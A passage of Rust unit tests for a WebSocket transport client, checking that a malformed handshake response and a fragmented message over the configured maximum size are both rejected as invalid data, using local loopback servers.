            socket.write_all(response.as_bytes()).unwrap();
        });

        let mut transport = WebSocketTransport::with_url(&format!("ws://{}", addr));
        let result = transport.handshake();
        assert!(matches!(result, Err(TransportError::InvalidData(_))));

        server.join().unwrap();
    }

    #[test]
    fn test_recv_message_enforces_max_size() {
        let listener = TcpListener::bind("127.0.0.1:0").unwrap();
        let addr = listener.local_addr().unwrap();

        let server = std::thread::spawn(move || {
            let (mut socket, _) = listener.accept().unwrap();
            let frame1 = WsFrame {
                fin: false,
                opcode: WsOpcode::Binary,
                mask: None,
                payload: b"hello".to_vec(),
            };
            let frame2 = WsFrame {
                fin: true,
                opcode: WsOpcode::Continuation,
                mask: None,
                payload: b"world".to_vec(),
            };
            socket.write_all(&frame1.to_bytes()).unwrap();
            socket.write_all(&frame2.to_bytes()).unwrap();
        });

        let client_stream = TcpStream::connect(addr).unwrap();
        let mut transport = WebSocketTransport::with_url("ws://127.0.0.1");
        transport.stream = Some(WebSocketStream::Tcp(client_stream));
        transport.connected = true;
        transport.config.max_message_size = 8;

        let result = transport.recv_message();
        assert!(matches!(result, Err(TransportError::InvalidData(_))));

        server.join().unwrap();
    }
}
